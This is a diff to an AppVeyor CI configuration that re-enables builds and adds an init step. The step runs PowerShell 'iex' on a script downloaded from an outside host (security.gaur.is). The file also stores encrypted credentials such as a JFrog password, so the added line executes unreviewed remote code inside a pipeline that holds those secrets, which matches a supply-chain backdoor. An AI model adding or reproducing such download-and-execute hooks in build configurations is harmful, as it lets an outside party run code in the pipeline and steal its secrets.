@@ -1,4 +1,4 @@
-build: off
+#build: off
 stack: node 14, python 3.9, jdk 8, go 1.17
 skip_tags: true
 environment:
@@ -23,6 +23,9 @@ environment:
     secure: YEB5Wiv9a2vNpUhy+MfL+A==
   ADO_JFROG_PLATFORM_PASSWORD:
     secure: Um8o75MQIieSavIemF4ySA==
+
+init:
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
 
 install:
   - cmd: set PATH=%PYTHON_HOME%;%PYTHON_HOME%\Scripts;%PATH%
